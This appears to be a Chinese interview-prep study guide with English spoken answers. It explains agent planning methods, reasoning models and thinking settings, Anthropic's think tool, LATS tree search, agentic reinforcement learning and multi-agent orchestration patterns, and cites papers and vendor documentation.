**来源：** [Anthropic：Introducing Contextual Retrieval（成本假设）](https://www.anthropic.com/news/contextual-retrieval)、[Elasticsearch 文档：Reciprocal rank fusion](https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion)、[Anthropic：How we built our multi-agent research system](https://www.anthropic.com/engineering/multi-agent-research-system)

---

## 模块 G：规划与推理 <a id="mg"></a> [↑ 目录](#toc)

### Q38 · CoT、ToT、Plan-and-Execute 分别是什么？Agent 里说的"规划"具体指什么？ <a id="q38"></a> [↑ 目录](#toc)

**English question:** What are Chain-of-Thought, Tree-of-Thoughts and Plan-and-Execute, and what does "planning" concretely mean inside an agent?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 控制面](06-ai-system-design.md#h19) 讲了 planner 产出子任务（subtask） DAG、静态 vs 动态规划（planning）、偏离就重规划（replanning）；[04 Agent 入门](notes/04-agent-basics.md) 的编排（orchestration）方式表有 plan-and-execute 一行。CoT / ToT 是本题新补。

**答案要点**
1. **CoT（chain-of-thought，思维链）**：让模型先写出中间推理（reasoning）步骤再给答案。Wei 等 2022 用几个带推理过程的示例（few-shot）做提示；Kojima 等 2022 发现只加一句 "Let's think step by step" 也有效（zero-shot CoT）。本质是**一条线性的推理路径**，多花输出 token 换准确率。
2. **ToT（tree of thoughts，思维树）**：Yao 等 2023。把推理拆成"想法"节点，每步生成多个候选，由模型自评打分，用 BFS / DFS 搜索，走不通可以回溯（backtracking）。论文里 24 点游戏：GPT-4 + CoT 只解出 4%，ToT 74%。代价是调用次数成倍增加。
3. **Plan-and-Execute（先计划后执行）**：先让一个规划器（planner）把目标拆成步骤列表，再由执行器（executor）逐步执行（可以用更便宜的模型），必要时重规划。学术上的近亲是 Plan-and-Solve 提示（Wang 等，ACL 2023：先制定计划再按计划解，针对 zero-shot CoT 的漏步错误）。和 ReAct（每步想一下做一下）相比，调用更少、步骤可预测，但环境变化时计划会过时。
4. **Agent 里的"规划"具体指四件事**：
   - **分解（decomposition）**：目标 → 子任务。
   - **排序和依赖（ordering）**：哪些串行（serial）、哪些可以并行（形成 DAG：有向无环图）。
   - **资源和工具选择**：每步用哪个工具、哪个模型、预算（budget）多少。
   - **监控（monitoring）与重规划（re-planning）**：每步结果和预期比，偏离就改计划。
5. **计划放在哪里**：只在模型脑子里（CoT / thinking）的计划不可审计（auditable）、上下文（context）被压缩（compaction）就丢了。生产上把计划**外化成显式产物**：todo 列表、DAG、状态表，由代码编排器（orchestrator）执行和检查（06 §2.3 的"The LLM proposes, the orchestrator disposes"）。
6. **今天的变化**：推理模型（Q39）把 CoT 内化进训练（training），**不需要再在 prompt 里写"一步一步想"**；但"任务级规划"（跨多次工具调用（tool call）、跨上下文窗口（context window））仍然要在 agent 层做。

**English answer (speakable, ~45–75 s):**
> Chain-of-thought means the model writes out intermediate reasoning before the answer — one linear path, more tokens for better accuracy. Tree-of-thoughts generalizes that into search: generate several candidate thoughts at each step, have the model score them, and explore with breadth- or depth-first search with backtracking. On the Game of 24 in the paper, GPT-4 went from 4 percent with chain-of-thought to 74 with tree search, at many times the calls. Plan-and-execute separates a planner that writes the step list from an executor that runs it, re-planning when results deviate.
> In an agent, planning concretely means decomposing the goal, ordering steps and finding what can run in parallel, choosing tools and budgets, and monitoring and re-planning. The production lesson is to externalize the plan — a to-do list or a DAG that code executes and checks — rather than leaving it inside the model's reasoning, where it can't be audited and disappears on compaction.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 什么时候选 ReAct，什么时候选 Plan-and-Execute？ | 环境不确定、下一步取决于上一步结果（排查问题）用 ReAct；步骤能提前想清、想要可预测和省钱（写多部分报告、批量处理）用 Plan-and-Execute。实务常混合：先出计划，执行中允许局部 ReAct，偏离再重规划 | ReAct when each step depends on what the last one revealed, like debugging. Plan-and-execute when the steps are knowable upfront and I want predictability and lower cost. In practice I mix them: a plan first, local ReAct inside steps, re-plan on deviation. |
| 用推理模型了还需要 CoT 提示吗？ | 一般不需要，甚至有害；给目标、约束、完成标准和输出格式即可（OpenAI 推理模型指南的建议），见 Q39 | Generally no. Reasoning models already think; I give them the goal, constraints, a definition of done and the output format instead of prescribing every step. |

**坑**
- 把 ToT 说成生产常用方法。它是研究方法，调用次数成倍增加，生产上更多用"多采样 + 验证器（verifier）"这类便宜版本（见 Q41）。
- 把 Plan-and-Execute 的计划当成一次定死。必须有重规划触发条件。
- 说"Agent 规划 = 模型自己想"。规划的产物要落到代码可检查的结构里。

**来源：** [Chain-of-Thought Prompting Elicits Reasoning in Large Language Models（arXiv 2201.11903）](https://arxiv.org/abs/2201.11903)、[Large Language Models are Zero-Shot Reasoners（arXiv 2205.11916）](https://arxiv.org/abs/2205.11916)、[Tree of Thoughts（arXiv 2305.10601）](https://arxiv.org/abs/2305.10601)、[Plan-and-Solve Prompting（arXiv 2305.04091）](https://arxiv.org/abs/2305.04091)、[LangChain：Plan-and-Execute Agents](https://www.langchain.com/blog/planning-agents)

---

### Q39 · 把推理模型（o 系列、DeepSeek-R1、Claude extended thinking）用在 Agent 里，有什么好处和坑？要注意什么？ <a id="q39"></a> [↑ 目录](#toc)

**English question:** What are the benefits and pitfalls of using reasoning models — the OpenAI o-series, DeepSeek-R1, Claude with extended thinking — inside an agent, and what do you need to watch out for?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.8 ① 模型路由](06-ai-system-design.md#h38) 讲简单给小模型（small model）、难的给大模型；[06 §2.9](06-ai-system-design.md#s2-9) 成本估算（estimation）。推理模型在 agent 里的具体用法是本题新补。

**答案要点**
1. **推理模型（reasoning model）是什么**：回答前先生成一段内部推理（reasoning / thinking tokens），通过强化学习（reinforcement learning, RL）训练出来（DeepSeek-R1 论文：GRPO 算法 + 规则奖励，R1-Zero 在 AIME 2024 上 pass@1 从 15.6% 涨到 71.0%）。好处：多步规划、读复杂工具结果（tool result）、政策判断、写代码更强。
2. **成本和延迟（latency）**：推理 token 不可见，但**占上下文、按输出 token 计费**。OpenAI 文档提醒推理可能在给出可见答案前就把 `max_output_tokens` 用完，建议起步至少预留 25,000 token。Agent 每步都用推理模型，延迟和成本按步数放大。
3. **怎么控制推理深度**：
   - OpenAI：`reasoning.effort`，可选值按模型不同，包括 `none / minimal / low / medium / high / xhigh / max`。
   - Claude：旧的手动模式 `thinking: {type: "enabled", budget_tokens: N}`（最少 1,024）已标为弃用（deprecated），Claude 4.7 及以后的模型直接返回 400；现在用自适应思考 `thinking: {type: "adaptive"}` + `output_config.effort`，模型自己决定想不想、想多少。改思考配置或预算会让提示缓存（prompt caching）失效，所以一个会话（session）里要保持稳定。
4. **跨工具调用要把推理状态传回去**（最容易踩的坑）：
   - OpenAI Responses API：函数调用时"强烈建议"把上一次的 reasoning items 连同函数输出一起传回；无状态（stateless）模式（`store: false` / 零数据保留）下用 `encrypted_content`。
   - Claude：要保留 thinking blocks；交错思考（interleaved thinking：在两次工具调用之间也能思考）在自适应模式下自动开启。Opus 4.5 及 4.6 以后的模型会把前几轮的 thinking blocks 保留在上下文里并按输入计费。
   - 自己写框架时如果把这些块丢掉，模型每步都"失忆"，效果明显变差。
5. **prompt 写法要变**：不要写"一步一步想"、不要规定每个中间步骤；给清楚的目标、约束、"完成"的定义和怎么自查（OpenAI 推理指南的建议）。
6. **不是所有推理模型都擅长工具调用**：DeepSeek-R1 论文自己写明，R1 在函数调用、多轮（multi-turn）对话、复杂角色扮演和 JSON 输出上不如 DeepSeek-V3。所以常见架构是**推理模型做规划器 / 难点判断，普通模型或小模型做执行器**，再用路由（routing）按难度分流。

**English answer (speakable, ~45–75 s):**
> Reasoning models think before answering, which helps exactly where agents struggle: multi-step planning, interpreting messy tool output, policy judgments. The costs are latency and hidden tokens — reasoning tokens are billed as output and take context space, and OpenAI warns you can burn your output limit before any visible answer.
> A few things I watch. One, control depth explicitly: reasoning effort on OpenAI, adaptive thinking with an effort level on Claude — the old fixed thinking budget is deprecated there. Keep the setting stable, because changing it invalidates the prompt cache. Two, preserve reasoning state across tool calls — pass back reasoning items or thinking blocks with the tool results. If a homegrown loop drops them, the model effectively loses its train of thought every step. Three, change the prompting: give goals, constraints and a definition of done, not "think step by step." And four, not every reasoning model is a good tool caller — DeepSeek's own paper says R1 trails V3 on function calling and JSON — so I often use the reasoning model as planner and a faster model as executor.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 推理模型的思考内容能直接展示给用户或拿来做审计吗？ | 不应依赖：OpenAI 不返回原始推理；Claude 返回的是摘要化的思考，部分情况是加密的。审计应依赖显式的工具调用日志和结构化决策记录，而不是思考文本 | I wouldn't rely on it. OpenAI doesn't expose raw reasoning, and Claude returns summarized or encrypted thinking. For audit I log tool calls and structured decision records, not the thinking text. |
| 怎么决定哪一步用推理模型？ | 离线评测按步骤类型分：规划、最终判断、复杂工具结果解读用推理模型；格式转换、简单查询用小模型。比较成功率和每任务成本，按数据定 | I evaluate per step type offline: planning, final judgments and complex tool-output interpretation get the reasoning model; formatting and simple lookups go to a small model. I compare success rate and cost per task. |

**坑**
- 在推理模型的 prompt 里继续写大段"请一步一步思考"的 CoT 模板。
- 自己写的循环（loop）把 reasoning items / thinking blocks 丢了，只传文本和工具结果。
- 说"Claude 用 `budget_tokens` 控制思考"而不知道它已弃用、新模型直接报错。

**来源：** [DeepSeek-R1（arXiv 2501.12948，Nature 645, 2025）](https://arxiv.org/abs/2501.12948)、[DeepSeek-R1 论文 HTML 版（GRPO、规则奖励、局限）](https://arxiv.org/html/2501.12948v1)、[OpenAI 文档：Reasoning models](https://developers.openai.com/api/docs/guides/reasoning)、[Claude 文档：Extended thinking（含弃用说明和迁移）](https://platform.claude.com/docs/en/build-with-claude/extended-thinking)

---

### Q40 · Anthropic 的 think tool 是什么？它和 extended thinking 有什么区别？什么时候用哪个？ <a id="q40"></a> [↑ 目录](#toc)

**English question:** What is Anthropic's "think" tool, how does it differ from extended thinking, and when would you use each?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。

**答案要点**
1. **think tool 是什么**（Anthropic 工程博客，2025-03-20）：一个**什么都不做的工具**，名字叫 `think`，只有一个字符串参数 `thought`。描述大意是"用来思考，不会获取新信息、不会改数据库（database），只把想法记进日志（logs）"。模型调用它，就相当于在工具调用链中间停下来，写一段笔记：读到的工具结果意味着什么、政策是否允许、下一步做什么。
2. **和 extended thinking 的区别**：
   - **时机**：（博客发布时的）extended thinking 发生在**回答开始之前**；think tool 发生在**回答过程中、拿到工具结果之后**。
   - **内容**：extended thinking 偏"全面规划"；think tool 偏"处理刚拿到的新信息"。
   - **实现**：extended thinking 是模型和 API 的能力；think tool 只是一个工具定义，任何支持工具调用的模型都能用，思考内容以工具参数的形式出现在日志里。
3. **博客里的数字**（Claude 3.7 Sonnet，τ-bench，pass^1）：
   - 航空（airline）领域：think tool + 优化后的 prompt（给出"怎么思考"的领域示例）0.570，基线（baseline） 0.370，相对提升 54%。
   - 零售（retail）领域：只加 think tool 0.812，基线 0.783。
   - SWE-bench：加 think tool 平均提升 1.6%。
   - 结论：**配合领域示例的 prompt 效果最好**；复杂政策场景收益大，简单场景收益小。
4. **2025-12-15 的更新**：Anthropic 在原文顶部注明，extended thinking 已经改进，**大多数情况下推荐用 extended thinking 而不是专门的 think tool**。原因是交错思考（interleaved thinking）让模型能在工具调用之间思考，think tool 的核心优势被模型原生能力覆盖了；Claude 现在的自适应思考默认就会交错。
5. **什么时候还用 think tool**：
   - 用的模型或接入方式不支持交错思考。
   - 想让"中间推理"作为普通工具调用出现在自己的 trace 和日志里，方便调试（仍不应当成合规审计（audit）依据）。
   - 政策密集、长链、每一步错了代价高的场景，并且评测（evaluation, eval）证明它有提升。
6. **方法论**：这是一个"用工具接口给模型加能力"的典型例子。一个零副作用（side effect）的工具 + 好的 prompt 示例就能改变行为；但模型原生能力跟上后，这类技巧要及时用评测验证是否还需要。

**English answer (speakable, ~45–75 s):**
> The think tool is a tool that does nothing. It has a single "thought" parameter, and its description says it won't fetch anything or change any state — it just records the thought. Calling it gives the model a structured pause in the middle of a tool chain to reason about what a result means, check a policy, and decide the next step.
> The original contrast was timing: extended thinking happened before the response started, while the think tool happens after new information arrives. In Anthropic's post, on the airline domain of tau-bench, the think tool with an optimized prompt took pass^1 from 0.37 to 0.57, and the gains were biggest in policy-heavy, long-chain tasks.
> But Anthropic updated the post in December 2025: extended thinking improved, and they now recommend it over a dedicated think tool in most cases, because the model can think between tool calls natively. So I'd default to native interleaved thinking, and keep the think tool for models or stacks that don't support it, or when I want those pauses visible as ordinary tool calls in my traces — and I'd verify either choice with evals.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 为什么一个空操作工具能提升效果？ | 它给了模型一个"在拿到新信息后、行动前"显式整理的位置；配合 prompt 里的领域示例（比如先列出适用规则、检查所需信息是否齐全），等于把检查清单嵌进了轨迹 | It gives the model an explicit place to organize its reasoning after new information and before acting. With domain examples in the prompt — list applicable rules, check you have what you need — it effectively embeds a checklist into the trajectory. |
| pass^1 是什么？ | τ-bench 的指标：同一任务跑 k 次全部成功的概率；k = 1 时就是单次成功率。Agent 评测看 pass^k 是为了衡量稳定性（见 Q60） | It's tau-bench's metric: the probability that all k trials of a task succeed. At k equals one it's just single-run success; higher k measures consistency. |

**坑**
- 只背 54% 不说前提：那是**航空领域 + 优化 prompt** 的结果；单加工具不加 prompt 提升小得多。另外博客正文写 0.570 vs 0.370，结果表里写 0.584 vs 0.332，两处数字不一致，引用时说"约 0.37 到 0.57"并注明出处。
- 不知道 2025-12 的更新，还把 think tool 当成首选方案推荐。
- 把 think tool 的内容当成可靠的"模型真实想法"做审计。

**来源：** [Anthropic Engineering：The "think" tool: Enabling Claude to stop and think in complex tool use situations](https://www.anthropic.com/engineering/claude-think-tool)、[Claude 文档：Extended thinking（交错思考与自适应思考）](https://platform.claude.com/docs/en/build-with-claude/extended-thinking)

---

### Q41 · LATS 这类在 Agent 上做树搜索的方法为什么在生产里用得少？什么场景值得用？ <a id="q41"></a> [↑ 目录](#toc)

**English question:** Why are tree-search methods for agents like LATS rarely used in production, and when are they worth it?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3 研究案例的共同骨架](06-ai-system-design.md#h20) 讲了"生成 → 验证 → 反思 → 选择"和"验证器越可靠越敢放开自主度"，是本题的生产版答案。LATS 本身是本题新补。

**答案要点**
1. **LATS（Language Agent Tree Search）是什么**（Zhou 等，2023-10）：把蒙特卡洛树搜索（MCTS：反复"选一个有希望的节点 → 展开 → 模拟 → 把结果回传更新价值"）用到 agent 上。节点是 agent 的状态，边是动作；用 LLM 当价值函数给节点打分，失败轨迹（trajectory）生成自我反思（self-reflection）存起来指导下一次搜索；同时利用环境反馈。论文结果：HumanEval pass@1 92.7%（GPT-4），WebShop 平均分 75.9（GPT-3.5）。
2. **为什么生产里少用**：
   - **需要能回退环境状态**：论文自己在局限里写明，LATS 假设可以回到决策环境里更早的状态。真实世界的动作多数不可逆：发出去的邮件、下了的单、改了的数据库都退不回来。
   - **成本和延迟**：论文承认它比 ReAct、Reflexion 计算成本更高；在 HotPotQA 上 LATS 用了 173,290 token，ToT 210,215 token。同一任务跑几十个节点，在线用户等不起。
   - **LLM 价值函数不可靠**：模型给"这一步有多好"打分噪声大，搜索方向容易被带偏；没有可靠的外部验证器时，搜索只是多花钱。
   - **难调试和评测**：一次请求几十条分支，trace 复杂，问题难复现（reproduce）。
   - **推理模型把一部分搜索内化了**：o 系列、R1 这类模型在推理 token 里已经做了"尝试 → 发现错误 → 换思路"。
3. **什么场景值得**：
   - 环境可以快照（snapshot） / 回滚（rollback）：沙箱（sandbox）里的代码（容器（container）快照、git）、模拟器、只读（read-only）查询。
   - **有便宜可靠的验证器**：单元测试（unit test）、编译器、数学答案校验（validation）、SQL 执行结果比对。
   - 离线或异步（asynchronous）任务，对延迟不敏感，单任务价值高（自动修 bug、离线生成训练数据）。
4. **生产里的便宜版本**：
   - **多采样 + 验证器（best-of-N）**：并行生成 N 个候选，跑测试选通过的，比完整树搜索（tree search）简单得多，容易并行。
   - **有限回溯**：失败时回到上一个检查点（checkpoint）重试（retry），用 git 分支或事务（transaction）做回滚。
   - **只对只读步骤展开搜索**，写操作（write operation）仍走单路径 + 人工确认（human confirmation）。

**English answer (speakable, ~45–75 s):**
> LATS applies Monte Carlo tree search to agents: states are nodes, actions are edges, an LLM scores nodes as a value function, and failed branches produce reflections that guide the next search. It got strong results on benchmarks like HumanEval and WebShop.
> It's rare in production for a few reasons. The paper itself assumes you can revert the environment to earlier states — but real actions like sending an email or placing an order can't be undone. It's expensive and slow compared with ReAct, which users feel directly. The LLM value function is noisy, so without an external verifier you're mostly buying more tokens. And it's hard to debug many branches per request. Reasoning models also internalize some of that try-and-backtrack behavior.
> Where it's worth it: sandboxed environments you can snapshot, like code in a container, with a cheap reliable verifier like a test suite, on offline tasks where each success is valuable. Even then I'd start with the cheap version — sample N candidates in parallel and let tests pick — before building full tree search.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| best-of-N 和 LATS 本质区别是什么？ | best-of-N 是在最终结果层面并行采样再选，没有中间节点的价值估计和回传；LATS 在每一步都做选择和回传，能更早剪枝，但复杂度和调用次数更高 | Best-of-N samples whole solutions in parallel and picks at the end, with no intermediate value estimates. LATS selects and backpropagates at every step, so it can prune earlier, at much higher complexity and call count. |
| 如果一定要在有副作用的环境里搜索怎么办？ | 先在影子环境 / 预演模式（dry-run）里搜索，只把最终选出的路径在真实环境执行一次；写操作前加人工确认 | Search in a shadow environment or a dry-run mode, then execute only the chosen path once for real, with human confirmation before writes. |

**坑**
- 只说"太贵"，漏掉最本质的一条：**真实环境的动作不可回退**。
- 把 LATS 的 92.7% 当作"树搜索在生产也会大幅提升"的证据。那是有测试用例（test case）当验证信号的编程题。
- 没提便宜的替代方案（多采样 + 测试选择）。

**来源：** [Language Agent Tree Search（arXiv 2310.04406）](https://arxiv.org/abs/2310.04406)、[LATS 论文 HTML 版 v3（局限、token 表）](https://arxiv.org/html/2310.04406v3)、[Tree of Thoughts（arXiv 2305.10601）](https://arxiv.org/abs/2305.10601)

---

### Q42 · 现在模型厂商怎么用 Agentic RL 训练工具使用能力？这对 Agent 开发者意味着什么？ <a id="q42"></a> [↑ 目录](#toc)

**English question:** How are model providers using agentic reinforcement learning to train tool-use capabilities, and what does that mean for people building agents?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。（[07 模型怎么训练、跑在什么硬件上](notes/07-how-models-are-trained.md) 讲模型训练流程的入门背景。）

**答案要点**
1. **什么是 Agentic RL**：传统的 LLM 强化学习多是"单步"：给一个 prompt，生成一个回答，打一个分。Agentic RL 把训练放进**多轮环境**里：模型在一条轨迹里多次调用工具（搜索、代码执行、浏览器、终端），环境返回结果，任务结束时按结果给奖励（reward）。综述《The Landscape of Agentic Reinforcement Learning for LLMs》把它形式化为从单步 MDP 到部分可观测马尔可夫决策过程（POMDP：智能体看不到环境全貌，只能靠观察逐步推断）的转变。
2. **关键做法**：
   - **可验证奖励（verifiable rewards）**：能用程序判断对错的任务（单元测试通过、答案匹配、任务状态达成）。DeepSeek-R1 用规则奖励（准确性 + 格式），明确说没用神经网络奖励模型，因为大规模 RL 里它容易被"奖励黑客"（reward hacking：模型找到骗分捷径而不是真正完成任务）。算法是 GRPO（组相对策略优化：同一题采样一组回答，用组内平均分当基线，省掉和策略模型一样大的评论家模型）。
   - **把工具放进 rollout**：OpenAI 发布 o3 / o4-mini（2025-04-16）时说明，两个模型都通过强化学习训练使用工具，不只学怎么用，还学**什么时候用**。
   - **大规模合成环境**：Kimi K2 技术报告（2025-07）描述了大规模 agentic 数据合成管线，加上在真实和合成环境中交互的联合强化学习阶段；报告的非思考模式分数：Tau2-Bench 66.1、SWE-Bench Verified 65.8。
3. **对 Agent 开发者意味着什么**：
   - **框架变薄**：模型已经学会"什么时候搜、搜不到换关键词、跑测试看报错再修"，手写的 CoT 模板、复杂的 ReAct prompt、硬编码的重试逻辑收益在下降。把精力放在工具、权限（permission）、状态、评测上。
   - **贴近训练分布的工具接口效果更好**：模型在训练里见过的是 shell、文件编辑、搜索这类通用工具和清晰的 JSON schema；厂商（vendor）提供的内置工具（例如 Anthropic 的 memory、bash、文本编辑工具）接口固定，通常比自己发明的奇怪接口更好用。工具返回清晰的错误信息，模型才能按训练里学会的方式自我纠正（self-correction）。
   - **奖励黑客会带到生产**：RL 训练出的模型可能学会"让测试通过"而不是"修好问题"（比如改测试、特判输入）。生产上要有独立验证（隐藏测试、代码审查（code review）、diff 范围限制）。
   - **评测和环境成为核心资产**：同样的思路可以用在自己身上，先把任务做成可自动打分的环境，才谈得上回归测试（regression testing）、选模型、乃至用自有数据做强化微调（fine-tuning）。
   - **换模型要重新评测**：不同厂商 RL 时用的工具格式和习惯不同，同一套 prompt 和工具换模型后行为会变（见 Q73）。

**English answer (speakable, ~45–75 s):**
> Agentic RL moves reinforcement learning from single-turn answers into multi-turn environments. The model calls real tools inside a rollout — search, code execution, a terminal — and gets rewarded on the outcome, ideally with a verifiable signal like tests passing or the task state being correct. DeepSeek-R1 showed the recipe for reasoning with GRPO and rule-based rewards, explicitly avoiding a learned reward model because of reward hacking. OpenAI said o3 and o4-mini were trained with RL to use tools, including when to use them. Kimi K2 describes large-scale synthetic agentic environments plus joint RL.
> For builders, three implications. First, the harness should get thinner — less hand-written chain-of-thought scaffolding, more investment in tools, permissions, state and evals. Second, tool interfaces close to what models were trained on — shell, file edits, search, clear schemas, informative errors — work better than exotic ones. Third, reward hacking carries over, so I'd still verify independently — hidden tests, diff limits, review — and re-run evals whenever I switch models.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 没有可验证奖励的任务（写报告、客服对话）怎么做 RL？ | 用评分标准（rubric）+ LLM 当裁判打分，或用人类偏好；风险是裁判可被钻空子，所以要混入可验证子目标（引用是否存在、格式是否正确）并抽样人工复核 | Use rubric-based LLM judges or human preferences, mixed with verifiable sub-goals like citation existence or schema validity, and spot-check with humans, because judges can be gamed. |
| 作为应用开发者，我需要自己做 RL 吗？ | 大多数情况不需要，先把 prompt、工具、上下文和评测做好；只有在任务高度专门、有大量可自动打分的样本、通用模型反复在同类步骤上失败时，才考虑用厂商的强化微调或开源模型自训 | Usually not. Get prompts, tools, context and evals right first. Only when the task is very specialized, you have lots of auto-gradable examples, and general models keep failing the same step would I consider reinforcement fine-tuning. |

**坑**
- 把 Agentic RL 和 RLHF 混为一谈。RLHF 主要是单轮偏好对齐；Agentic RL 的关键是多轮环境、工具在回路里、结果奖励。
- 说"模型会用工具了，所以不需要设计工具了"。接口设计、错误信息、权限仍然决定成败。
- 引用 Kimi K2 的分数不说是"非思考模式"、厂商自报。

**来源：** [The Landscape of Agentic Reinforcement Learning for LLMs: A Survey（arXiv 2509.02547）](https://arxiv.org/abs/2509.02547)、[DeepSeek-R1 论文 HTML 版](https://arxiv.org/html/2501.12948v1)、[OpenAI：Introducing OpenAI o3 and o4-mini](https://openai.com/index/introducing-o3-and-o4-mini/)、[Kimi K2: Open Agentic Intelligence（arXiv 2507.20534）](https://arxiv.org/abs/2507.20534)


## 模块 H：多智能体编排 <a id="mh"></a> [↑ 目录](#toc)

![三种多智能体组织方式：子 agent 当工具、移交、团队](notes/images/06d-multi-agent.svg)

### Q43 · 多智能体系统有哪些常见架构？handoff 和 agents-as-tools 有什么区别，各适合什么场景？ <a id="q43"></a> [↑ 目录](#toc)

**English question:** What are the common multi-agent architectures? What's the difference between handoffs and agents-as-tools, and when would you use each?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4 通信模式 A–E](06-ai-system-design.md#h23) 已有主管-工人、移交（handoff）、共享状态（shared state）、点对点、生成-评审五种模式的风险与控制表；[06 B. 移交](06-ai-system-design.md#h25) 有 handoff 的防踢皮球做法；[06 怎么选](06-ai-system-design.md#h29) 有选型顺序；[06 §2.3](06-ai-system-design.md#s2-3) 有"先问要不要多 agent"的四个问题。本题补 OpenAI Agents SDK 官方对两种编排（orchestration）的定义。

**答案要点**
1. **先说默认**：能用固定流程（workflow：步骤顺序由代码写死，模型只在某一步里做判断）解决的，不上多 agent。多 agent 是在单 agent 已经评测（evaluation, eval）过、确实不够时才用。
2. **五种常见架构**：
   - 主管-工人（orchestrator-workers / supervisor）：一个主 agent 拆任务，并行（parallel）派给子 agent，收回压缩（compaction）后的结果再汇总。
   - 移交（handoff）：当前 agent 把"谁负责这段对话"整个交给另一个 agent。
   - 共享状态 / 黑板（shared state / blackboard）：各 agent 不直接对话，只读写（read/write）同一份带类型的状态。
   - 点对点协议（peer-to-peer，比如 A2A）：跨组织、跨厂商（vendor）的 agent 互发任务。
   - 生成-评审循环（evaluator-optimizer）：一个写，另一个按标准挑错，迭代修改。
3. **agents-as-tools（把 agent 当工具用，即 manager 模式）**：OpenAI Agents SDK 里用 `Agent.as_tool()` 实现。manager agent 始终持有对话，把专家 agent 当一个工具调用（tool call），拿回结果后自己组织最终回答。适合三种情况：最终答案必须由一个 agent 负责；要合并多个专家的输出；护栏（guardrails：输入输出的安全检查）要集中放在一处。
4. **handoff**：分诊（triage） agent 调用一个形如 `transfer_to_refund_agent` 的工具。从这一刻起，专家 agent 成为本轮的活跃 agent（active agent），直接回复用户。适合"路由（routing）本身就是流程的一部分"，以及各专家需要不同指令、不同工具权限（permission）的场景，比如客服里的分诊 → 退款（refund） → 技术支持。
5. **两者可以叠加**：分诊 agent 先 handoff 给专家，专家再把更小的 agent 当工具调用。LangChain 1.x 现在也推荐用"子 agent 包成工具"的方式实现 supervisor，不再推荐专门的 supervisor 库。
6. **一句话区分**：agents-as-tools 是"派活，结果交回来，我负责"；handoff 是"换人负责"。

**English answer (speakable, ~45–75 s):**
> The common shapes are orchestrator-workers, handoffs, shared state, cross-organization protocols like A2A, and generator–evaluator loops. But my first question is always whether a fixed workflow would do, because that's cheaper and easier to evaluate. Between handoffs and agents-as-tools, the difference is who owns the conversation. With agents-as-tools, a manager agent stays in charge: it calls a specialist like a function, gets a result back, and writes the final answer, so guardrails and the final voice live in one place. With a handoff, ownership moves: the triage agent transfers control and the specialist talks to the user directly from then on. I use handoffs when stages need different instructions or different tool permissions, like triage to refunds. I use agents-as-tools when I need several results combined into one answer. And you can nest them: a specialist that received a handoff can still call narrow sub-agents as tools.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| handoff 时权限怎么处理？ | 权限跟着 agent 走，不跟着对话走。退款工具只挂在退款 agent 上。写操作仍要过服务端策略检查。移交带结构化摘要，并限制最多移交几次。 | "Permissions belong to the agent, not the conversation. The refund tool only exists on the refund agent, writes still go through server-side policy, and I cap the number of handoffs and pass a structured summary." |
| agents-as-tools 的缺点？ | manager 的上下文会累积所有子结果，所以子 agent 必须返回压缩结果；多一跳，延迟也多一跳。 | "The manager's context accumulates every sub-result, so specialists must return compressed outputs, and each hop adds latency." |

**坑**
- 把 handoff 说成"发一条消息给另一个 agent"。它转移的是控制权，原 agent 退出本轮。
- 不先问"要不要多 agent"就直接画五个 agent。面试官想听的是默认用 workflow，多 agent 要拿评测数据证明值得。
- 以为 handoff 后上下文（context）自动"干净"。默认会带上历史；Agents SDK 用输入过滤（input filter）决定传哪些历史给下一个 agent。

**来源：** [OpenAI Agents SDK – Agent orchestration](https://openai.github.io/openai-agents-python/multi_agent/)、[Anthropic – Building effective agents](https://www.anthropic.com/engineering/building-effective-agents)、[LangChain multi-agent 文档](https://docs.langchain.com/oss/python/langchain/multi-agent)

---

### Q44 · Anthropic 的多智能体研究系统比单 agent 强 90.2%，这个提升从哪里来？代价是什么？ <a id="q44"></a> [↑ 目录](#toc)

**English question:** Anthropic reported that its multi-agent research system outperformed a single agent by 90.2%. Where does that gain come from, and what does it cost?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 A. 主管-工人](06-ai-system-design.md#h24) 已引用 Anthropic 的"简单查询 1 个 agent、比较类 2–4 个、复杂研究 10 个以上"经验法则，并给了任务模板、预算（budget）和失败处理；[06 §2.3](06-ai-system-design.md#s2-3) 有"值不值得多花几倍到十几倍 token"的判断。本题补 90.2% 的准确口径和方差分析。

**答案要点**
1. **数字的准确口径**：在 Anthropic **内部研究评测集（eval set）**上，Claude Opus 4 当主 agent、Claude Sonnet 4 当子 agent 的多 agent 系统，比单个 Claude Opus 4 高 90.2%。这是相对提升，评测集是他们自己的。博客 2025-06-13 发布。
2. **提升从哪来：主要是多花了 token**。他们在 BrowseComp（考 agent 在网上找难找信息的评测）上分析：三个因素解释了 95% 的表现差异，**仅 token 用量一项就解释了 80%**，另外两项是工具调用次数和模型选择。
3. **多 agent 的本质**：每个子 agent 有独立的上下文窗口（context window：模型一次能看到的全部输入），可以并行探索不同方向，再把压缩后的结果交给主 agent。等于突破了单个上下文窗口的限制，把更多 token 花在问题上。所以它适合广度优先、能拆成独立方向的调研。
4. **代价**：agent 一般比聊天多用约 4 倍 token，多 agent 系统约 15 倍。所以只适合任务价值够高的场景。
5. **不适合的场景**（原文）：需要所有 agent 共享同一份上下文、子任务（subtask）之间依赖多的领域；大多数编程任务（真正能并行的部分比调研少）；需要实时协调的任务。
6. **工程代价**：早期出现过简单查询派出 50 个子 agent、子 agent 重复劳动、主 agent 要同步（synchronous）等待所有子 agent 完成（同步执行是瓶颈）。上线还要用彩虹部署（rainbow deployment：新旧版本同时运行，流量逐步切过去），以免打断正在跑的长任务。

**English answer (speakable, ~45–75 s):**
